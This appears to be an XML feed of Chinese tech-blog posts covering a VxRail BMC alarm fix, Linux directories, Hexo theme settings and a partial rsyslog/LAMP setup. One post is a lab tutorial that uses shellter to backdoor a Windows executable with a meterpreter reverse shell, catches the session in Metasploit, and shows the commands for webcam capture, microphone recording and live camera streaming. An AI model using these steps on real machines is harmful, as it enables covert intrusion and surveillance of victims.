        <content type="html"><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><ol><li>VXRail 服务器闪黄灯</li><li>VXrail Manager 出现 MYSTIC028005 警报</li></ol><h2 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h2><ol><li>登陆到 VXrail Manager，查看是哪个节点报错，并点击“感叹号”，找到相应的主机。</li></ol><p><img src="https://i.loli.net/2019/08/30/rgDWS8mOE9KIkCF.png" alt="vxrail-9.png"></p><p><img src="https://i.loli.net/2019/08/30/yi7JFfIt4GEmh8O.png" alt="vxrail-10.png"></p><ol start="2"><li>找到对应的主机，选择 “监控” —&gt; “硬件状态” —&gt; “传感器” —&gt; “基线版管理控制器”</li></ol><p><img src="https://i.loli.net/2019/08/27/mScTquMZtzaJViY.png" alt="vxrail-1.png"></p><ol start="3"><li>展开“基线版管理控制器”，找到 BMC 地址</li></ol><p><img src="https://i.loli.net/2019/08/27/HDFBwSVA5Mb1lgY.png" alt="vxrail-2.png"></p><ol start="4"><li>登陆到 BMC，在 dashboard 界面找到 “Sensor Monitoring”。服务状态全是绿的，说明服务正常运行，出现的警告是假警告</li></ol><p><img src="https://i.loli.net/2019/08/27/8cfRl3DGVzsIdqM.png" alt="vxrail-3.png"></p><ol start="5"><li>清除 BMC 的日志</li></ol><p><img src="https://i.loli.net/2019/08/27/RdbFHfMcj1Y4X3r.png" alt="vxrail-5.png"></p><p><img src="https://i.loli.net/2019/08/27/n4I8zxomXvLlOSU.png" alt="vxrail-6.png"></p><ol start="6"><li>编辑主机的“安全配置文件”，开启 SSH 服务</li></ol><p><img src="https://i.loli.net/2019/08/30/VABKd5ozschxfYi.png" alt="vxrail-11.png"></p><p><img src="https://i.loli.net/2019/08/27/qzC1fYjQyr6uLGW.png" alt="vxrail-4.png"></p><ol start="7"><li>通过xshell连接到主机，并执行以下命令。清除记录并重启 BMC</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ntzyy06:~<span class="token punctuation">]</span> /tmp/vspexblue/bin/ipmitool sel <span class="token function">clear</span><span class="token punctuation">[</span>root@ntzyy06:~<span class="token punctuation">]</span> /tmp/vspexblue/bin/ipmitool mc reset cold<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/08/27/WXjTnG2vw61IBEK.png" alt="vxrail-7.png"></p><ol start="8"><li>再次登陆到 VXRail，并检查服务器还有没有警告。</li></ol><p><img src="https://i.loli.net/2019/08/27/aI83CvlnhJHbcuN.png" alt="vxrail-8.png"></p><p>注：这个问题通常发生在低版本的Quanta节点上，且现在运行的版本过于老旧，所以建议进行系统升级。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> HCI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vxrail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux目录架构</title>
      <link href="/2019/08/24/linux%E7%9B%AE%E5%BD%95%E6%9E%B6%E6%9E%84/"/>
      <url>/2019/08/24/linux%E7%9B%AE%E5%BD%95%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash"><code class="language-bash">/├── bin -<span class="token operator">&gt;</span> usr/bin                  //存放系统管理员及普通用户使用的命令和可执行的二进制文件├── boot                            //存放启动 linux 时使用的一些内核文件和引导程序文件├── dev                             //访问外部设备文件的接口（相当于识别出设备，但无法访问）├── etc                             //存放系统配置文件和子目录├── home                            //存放系统用户目录├── lib -<span class="token operator">&gt;</span> usr/lib                  //存放 32 位系统使用函数库目录（类似 windows 中的 DLL 文件）├── lib64 -<span class="token operator">&gt;</span> usr/lib64              //存放 64 位系统使用函数库目录├── media                           //自动识别挂载设备（如：U盘、移动硬盘等）├── mnt                             //让管理员手动挂载临时媒体设备├── opt                             //存放系统额外安装的软件├── proc                            //它是一个虚拟目录，映射系统的内存信息，通常直接访问这个目录来获取系统信息。├── root                            //超级用户主目录├── run                             //一个临时文件系统，存储系统启动的信息，当系统重启时，这个目录下的文件会被删掉除。├── sbin -<span class="token operator">&gt;</span> usr/sbin                //存放系统管理员使用的可执行命令├── srv                             //存放一些服务启动之后需要提取的数据（例如www服务启动后，数据就会存放在/srv/www内）├── sys                             //存放sysfs文件系统，用户科通过访问这个目录，来查看内核驱动及设备等├── tmp                             //存放临时文件├── usr                             //用户的应用程序存放目录└── var                             //存放系统执行过程中经常变化的文件（如：日志文件、登录文件、邮件文件等）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://blog.csdn.net/m0_38044196/article/details/72844025" target="_blank" rel="noopener">Linux目录结构及详细介绍</a></p><p><a href="https://blog.csdn.net/wangyanlong0107/article/details/84926398" target="_blank" rel="noopener">【转】/mnt /media /dev 目录区别</a></p><p><a href="https://blog.csdn.net/luckywang1103/article/details/25715101" target="_blank" rel="noopener">linux /sys目录下的各个子目录说明</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Directory </tag>
            
            <tag> architecture </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用反向shell控制摄像头</title>
      <link href="/2019/08/22/%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91shell%E6%8E%A7%E5%88%B6%E6%91%84%E5%83%8F%E5%A4%B4/"/>
      <url>/2019/08/22/%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91shell%E6%8E%A7%E5%88%B6%E6%91%84%E5%83%8F%E5%A4%B4/</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>系统：Kali、windows 10 （电脑上带摄像头）</p><p>软件：shellter（kali 默认安装）</p><p>注：关闭防火墙和杀毒软件</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><ol><li><p>将任意 PE 软件，放到 Kali 系统中</p></li><li><p>运行 shellter</p></li></ol><pre class="line-numbers language-bash"><code class="language-bash">root@kali:/home/SHELL<span class="token comment" spellcheck="true"># shellter</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>在 shellter 弹窗中输入 A（Auto，自动添加后门），第二行输入 PE 软件的存放路径</li></ol><p><img src="https://i.loli.net/2019/08/23/hcHEKL9xQfSklXF.png" alt="shellter-1.png"></p><ol start="4"><li>这里提示：是否添加一个后门模块，这里选择 “ Y “ </li></ol><p><img src="https://i.loli.net/2019/08/23/Vrxq6Fpu8G3gWlf.png" alt="shellter-2.png"></p><ol start="5"><li>首先输入 “ L “ ，然后输入模块编号 “ 1 “（meterpreter_reverse_tcp）,最后输入我们需要监听的  地址（kali 系统的ip）和端口号。</li></ol><p><img src="https://i.loli.net/2019/08/23/7fQZB8Xbke5gHNd.png" alt="shellter-3.png"></p><ol start="6"><li>末尾没有报错，说明后门已经写入成功</li></ol><p><img src="https://i.loli.net/2019/08/23/xy1pjkw38lMtZSd.png" alt="shellter-4.png"></p><ol start="7"><li>打开 msf，并监听地址和端口</li></ol><pre class="line-numbers language-bash"><code class="language-bash">root@kali:/home/SHELL<span class="token comment" spellcheck="true"># msfconsole</span>msf5 <span class="token operator">&gt;</span> use multi/handlermsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> payload windows/meterpreter/reverse_tcppayload <span class="token operator">=</span><span class="token operator">&gt;</span> windows/meterpreter/reverse_tcpmsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> LHOST 192.168.124.26LHOST <span class="token operator">=</span><span class="token operator">&gt;</span> 192.168.124.26msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> LPORT 4444LPORT <span class="token operator">=</span><span class="token operator">&gt;</span> 4444msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="8"><li><p>将添加好后门的 PE 软件，放到 windows 10 系统中并运行。 </p></li><li><p>msf 监听到了会话，并进行摄像头操作</p></li></ol><pre class="line-numbers language-bash"><code class="language-bash">// ** 将添加了后门的软件，放到 windwos 中，并运行.出现如下内容，说明反向shell已经成功 ** //<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 192.168.124.26:4444 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span>179779 bytes<span class="token punctuation">)</span> to 192.168.124.25<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session 1 opened <span class="token punctuation">(</span>192.168.124.26:4444 -<span class="token operator">&gt;</span> 192.168.124.25:1773<span class="token punctuation">)</span> at 2019-08-23 00:40:53 +0800// ** 查看摄像头 ** //meterpreter <span class="token operator">&gt;</span> webcam_list1: Chicony USB2.0 Camera// ** 用摄像头进行拍照 ** //meterpreter <span class="token operator">&gt;</span> webcam_snap -i 1<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting<span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Got frame<span class="token punctuation">[</span>*<span class="token punctuation">]</span> StoppedWebcam shot saved to: /root/sUqFcfWF.jpegmeterpreter <span class="token operator">&gt;</span> gimp_device_info_set_device: trying to <span class="token keyword">set</span> GdkDevice <span class="token string">'VirtualPS/2 VMware VMMouse'</span> on GimpDeviceInfo <span class="token function">which</span> already has a device// ** 录制声音 ** //meterpreter <span class="token operator">&gt;</span>  record_mic<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> StoppedAudio saved to: /root/fSAEXVSs.wav// ** 开启摄像头（在 /var/www//webcam.htm 中可以看到截取的图片） ** //meterpreter <span class="token operator">&gt;</span> run webcam -p /var/www/<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated. Try post/windows/manage/webcam.<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example: run post/windows/manage/webcam OPTION<span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting webcam 1: Chicony USB2.0 Camera<span class="token punctuation">[</span>*<span class="token punctuation">]</span> imagepath is /var/www//webcam-00000.jpg<span class="token punctuation">[</span>*<span class="token punctuation">]</span> View live stream at: /var/www//webcam.htm<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Image saved to <span class="token keyword">:</span> /var/www//webcam-00000.jpg<span class="token punctuation">[</span>8243:8243:0823/004940.714044:ERROR:zygote_host_impl_linux.cc<span class="token punctuation">(</span>89<span class="token punctuation">)</span><span class="token punctuation">]</span> Running as root without --no-sandbox is not supported. See https://crbug.com/638180// ** 关闭摄像头 ** //run webcam -s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong></strong></p><center><strong>不得将本文用作违法犯罪目的，本文只用作技术分享交流学习使用。</strong></center><p></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://www.freebuf.com/articles/system/209261.html" target="_blank" rel="noopener">使用反向Shell控制摄像头</a></p><p><a href="https://www.cnblogs.com/Sunben/p/10574924.html" target="_blank" rel="noopener">meterpreter后渗透之摄像头和录音详细用法</a></p><p><a href="https://bbs.ichunqiu.com/thread-25177-1-1.html" target="_blank" rel="noopener">屌丝绅士-后门捆绑工具-shellter</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> system security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> shellter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-next主题优化</title>
      <link href="/2019/08/08/hexo-next%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96/"/>
      <url>/2019/08/08/hexo-next%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="设置主题样式"><a href="#设置主题样式" class="headerlink" title="设置主题样式"></a>设置主题样式</h2><ol><li>修改 themes\next\_config.yml</li></ol><pre class="line-numbers language-yml"><code class="language-yml"># Schemes#scheme: Muse# scheme: Mistscheme: Pisces#scheme: Gemini<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="添加标签（tags）和分类页面（categories）"><a href="#添加标签（tags）和分类页面（categories）" class="headerlink" title="添加标签（tags）和分类页面（categories）"></a>添加标签（tags）和分类页面（categories）</h2><ol><li>开启 tags 和 categories<br>修改 themes\next\_config.yml ，将 tags 和 categories 前的 “#” 删掉</li></ol><pre class="line-numbers language-yml"><code class="language-yml">menu:  home: / || home  # about: /about/ || user  tags: /tags/ || tags  categories: /categories/ || th  archives: /archives/ || archive  # schedule: /schedule/ || calendar  # sitemap: /sitemap.xml || sitemap  # commonweal: /404/ || heartbeat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>生成页面</li></ol><pre class="line-numbers language-bash"><code class="language-bash">$ hexo new page tagsINFO  Created: E:\My_Blog\source\tags\index.md$ hexo new page categoriesINFO  Created: E:\My_Blog\source\categories\index.md<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>分别修改 index.md</li></ol><pre class="line-numbers language-bash"><code class="language-bash">---title: tagsdate: 2019-08-09 10:41:40type: <span class="token string">"tags"</span>---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">---title: categoriesdate: 2019-08-09 10:43:31type: <span class="token string">"categories"</span>---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>检查页面配置<br>开启本地的 hexo 服务，并查看页面配置</li></ol><pre class="line-numbers language-bash"><code class="language-bash">$ hexo s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：hexo 默认配置了首页（home）和归档（archives）页面，其他新开的页面需要自己手动生成。</p><h2 id="添加本地搜索"><a href="#添加本地搜索" class="headerlink" title="添加本地搜索"></a>添加本地搜索</h2><ol><li>安装 hexo-generator-search</li></ol><pre class="line-numbers language-bash"><code class="language-bash">$  <span class="token function">npm</span> <span class="token function">install</span> hexo-generator-search --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>开启本地搜索，将 “enable: “ 的值改为 “true”</li></ol><pre class="line-numbers language-yml"><code class="language-yml"># Local search# Dependencies: https://github.com/theme-next/hexo-generator-searchdblocal_search:  enable: true  # If auto, trigger search by changing input.  # If manual, trigger search by pressing enter key or search button.  trigger: auto  # Show top n results per article, show all results by setting to -1  top_n_per_article: 1  # Unescape html strings to the readable one.  unescape: false  # Preload the search data when the page loads.  preload: false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="添加背景特效"><a href="#添加背景特效" class="headerlink" title="添加背景特效"></a>添加背景特效</h2><ol><li>安装 theme-next-canvas-nest</li></ol><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">cd</span> themes/next$ <span class="token function">git</span> clone https://github.com/theme-next/theme-next-canvas-nest source/lib/canvas-nest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>开启 canvas_nest 背景特效，将 “enable: “ 的值改为 “true”</li></ol><pre class="line-numbers language-yml"><code class="language-yml">canvas_nest:  enable: true  onmobile: true # display on mobile or not  color: '0,0,255' # RGB values, use ',' to separate  opacity: 0.5 # the opacity of line: 0~1  zIndex: -1 # z-index property of the background  count: 99 # the number of lines<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="设置加载进度样式"><a href="#设置加载进度样式" class="headerlink" title="设置加载进度样式"></a>设置加载进度样式</h2><ol><li>安装 heme-next-pace</li></ol><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">cd</span> themes/next$ <span class="token function">git</span> clone https://github.com/theme-next/theme-next-pace source/lib/pace<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>开启 pace ，”theme:” 设置进度条样式</li></ol><pre class="line-numbers language-yml"><code class="language-yml"># Progress bar in the top during page loading.# Dependencies: https://github.com/theme-next/theme-next-pace# For more information: https://github.com/HubSpot/pacepace:  enable: true  # Themes list:  # big-counter | bounce | barber-shop | center-atom | center-circle | center-radar | center-simple  # corner-indicator | fill-left | flat-top | flash | loading-bar | mac-osx | material | minimal  theme: corner-indicator<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="设置侧边栏"><a href="#设置侧边栏" class="headerlink" title="设置侧边栏"></a>设置侧边栏</h2><ol><li>修改 themes\next\_config.yml</li></ol><pre class="line-numbers language-yml"><code class="language-yml">sidebar:  # 侧边栏位置  # Sidebar Position.  position: left  #position: right  # 侧边栏大小  # Manual define the sidebar width. If commented, will be default for:  # Muse | Mist: 320  Pisces | Gemini: 400  width: 300<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="添加头像"><a href="#添加头像" class="headerlink" title="添加头像"></a>添加头像</h2><ol><li>修改 themes\next\_config.yml</li></ol><pre class="line-numbers language-yml"><code class="language-yml"># Sidebar Avataravatar:  # In theme directory (source/images): /images/avatar.gif  # In site directory (source/uploads): /uploads/avatar.gif  # You can also use other linking images.  # 头像最好本地存放，存储位置在 themes\next\source\images  url: /images/tx1.jpg  # If true, the avatar would be dispalyed in circle.  rounded: false  # If true, the avatar would be rotated with the cursor.  rotated: false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>设置头像旋转效果</li></ol><p>将文件 themes\next\source\css_common\components\sidebar 的内容替换</p><pre class="line-numbers language-yml"><code class="language-yml">.site-author-image {  display: block;  margin: 0 auto;  padding: $site-author-image-padding;  max-width: $site-author-image-width;  height: $site-author-image-height;  border: $site-author-image-border-width solid $site-author-image-border-color;  border-radius: 60%;  transition: 2.5s all;  }.site-author-image:hover {    transform: rotate(360deg);}.site-author-name {  margin: $site-author-name-margin;  text-align: $site-author-name-align;  color: $site-author-name-color;  font-weight: $site-author-name-weight;}.site-description {  margin-top: $site-description-margin-top;  text-align: $site-description-align;  font-size: $site-description-font-size;  color: $site-description-color;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="博客总访问量"><a href="#博客总访问量" class="headerlink" title="博客总访问量"></a>博客总访问量</h2><ol><li>修改 themes\next\_config.yml<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Show Views / Visitors of the website / page with busuanzi.</span><span class="token comment" spellcheck="true"># Get more information on http://ibruce.info/2015/04/04/busuanzi</span>busuanzi_count:enable: <span class="token boolean">true</span>total_visitors: <span class="token boolean">true</span>total_visitors_icon: usertotal_views: <span class="token boolean">true</span>total_views_icon: eyepost_views: <span class="token boolean">true</span>post_views_icon: eye<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>在 themes\next\layout\_partials\footer.swig 中添加如下内容</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>div<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script async src<span class="token operator">=</span><span class="token string">"https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>/script<span class="token operator">&gt;</span><span class="token operator">&lt;</span>span id<span class="token operator">=</span><span class="token string">"busuanzi_container_site_pv"</span> style<span class="token operator">=</span><span class="token string">'display:none'</span><span class="token operator">&gt;</span>    本站总访问量 <span class="token operator">&lt;</span>span id<span class="token operator">=</span><span class="token string">"busuanzi_value_site_pv"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>/span<span class="token operator">&gt;</span> 次    <span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"post-meta-divider"</span><span class="token operator">&gt;</span><span class="token operator">|</span><span class="token operator">&lt;</span>/span<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/span<span class="token operator">&gt;</span><span class="token operator">&lt;</span>span id<span class="token operator">=</span><span class="token string">"busuanzi_container_site_uv"</span> style<span class="token operator">=</span><span class="token string">'display:none'</span><span class="token operator">&gt;</span>    有<span class="token operator">&lt;</span>span id<span class="token operator">=</span><span class="token string">"busuanzi_value_site_uv"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>/span<span class="token operator">&gt;</span>人看过我的博客啦<span class="token operator">&lt;</span>/span<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/div<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="设置代码样式"><a href="#设置代码样式" class="headerlink" title="设置代码样式"></a>设置代码样式</h2><ol><li>修改 themes\next\_config.yml</li></ol><pre class="line-numbers language-yml"><code class="language-yml">codeblock:  # Code Highlight theme  # Available values: normal | night | night eighties | night blue | night bright  # See: https://github.com/chriskempson/tomorrow-theme  highlight_theme: night  # Add copy button on codeblock  copy_button:    enable: true    # Show text copy result.    show_result: true    # Available values: default | flat | mac    style: flat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hexo-next-主题将首页文章设为预览"><a href="#hexo-next-主题将首页文章设为预览" class="headerlink" title="hexo next 主题将首页文章设为预览"></a>hexo next 主题将首页文章设为预览</h2><p>编辑 themes/next 目录下的 _config.yml 文件,搜索 “auto_excerpt” 关键字，并修改位如下内容：</p><pre class="line-numbers language-yml"><code class="language-yml"># Automatically Excerpt. Not recommand.# Please use <!-- more --> in the post to control excerpt accurately.auto_excerpt:  enable: true  length: 150   # 文章预览的文本长度<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://blog.pangao.vip/Hexo%E5%8D%9A%E5%AE%A2NexT%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96%E4%B9%8B%E9%A1%B6%E9%83%A8%E5%8A%A0%E8%BD%BD%E8%BF%9B%E5%BA%A6%E6%9D%A1/" target="_blank" rel="noopener">Hexo博客NexT主题美化之顶部加载进度条</a></p><p><a href="https://github.com/theme-next/theme-next-pace">theme-next-pace</a></p><p><a href="https://theme-next.org/docs/theme-settings/sidebar" target="_blank" rel="noopener">sidebar</a></p><p><a href="https://blog.csdn.net/weixin_39345384/article/details/80785373" target="_blank" rel="noopener">Hexo框架下用NexT(v7.0+)主题美化博客</a></p><p><a href="https://www.jianshu.com/p/3a05351a37dc" target="_blank" rel="noopener">Hexo的Next主题详细配置</a></p><p><a href="http://theme-next.iissnan.com/theme-settings.html" target="_blank" rel="noopener">主题配置</a></p><p><a href="https://hexo.io/plugins/" target="_blank" rel="noopener">hexo plugins</a></p><p><a href="https://www.jianshu.com/p/393d067dba8d" target="_blank" rel="noopener">Hexo之next主题设置首页不显示全文(只显示预览)</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> theme-next </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rsyslog服务器搭建</title>
      <link href="/2019/08/06/rsyslog%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"/>
      <url>/2019/08/06/rsyslog%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="服务器："><a href="#服务器：" class="headerlink" title="服务器："></a>服务器：</h3><p>centos6.5（默认安装rsyslog）<br>IP：192.168.0.101</p><h3 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h3><p>centos6.5<br>IP：192.168.0.105</p><p>前提要配置好 服务器 和 客户端 的网络，让它们能上网</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><ol><li>查看 rsyslog 的版本</li></ol><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token comment" spellcheck="true"># rsyslogd -v</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>防火墙配置</li></ol><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token comment" spellcheck="true"># vim /etc/sysconfig/iptables</span>//** 添加如下内容 **//-A INPUT -m state --state NEW -m tcp -p tcp --dport 514 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>重启防火墙</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># services iptables restart</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>关闭 selinux</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># sed -i 's/enforcing/disabled/' /etc/selinux/config</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>安装 lamp</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># yum install php php-mysql php-common php-gd php-mbstring php-mcrypt php-devel php-xml mysql mysql-server wget gcc c++ -y</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="6"><li>添加开机自启动项</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># chkconfig httpd on</span><span class="token comment" spellcheck="true"># chkconfig mysqld on </span><span class="token comment" spellcheck="true"># chkconfig rsyslog on </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="7"><li>配置 httpd</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># vim /etc/httpd/conf/httpd.conf</span>ServerName 127.0.0.1:80    //** 编辑 ServerName example.com:80 **////** 在 639行添加如下内容 **//AddType application/x-httpd-php .phpAddType application/x-httpd-php-source .phps<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="8"><li>开启服务</li></ol><pre class="line-numbers language-bash"><code 